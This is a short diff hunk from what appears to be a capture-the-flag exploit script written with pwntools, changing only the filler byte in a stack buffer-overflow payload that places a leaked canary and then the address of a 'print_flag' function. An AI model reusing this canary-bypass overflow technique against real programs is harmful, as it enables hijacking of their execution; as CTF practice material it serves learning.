@@ -18,7 +18,7 @@ log.info(f"Canary: {canary:x}")
 win = exe.symbols['print_flag']
 # log.info(hex(win))
 
-payload = b"A" * 72
+payload = b"M" * 72
 payload += p64(canary)
 payload += b"B" * 8
 payload += p64(win)
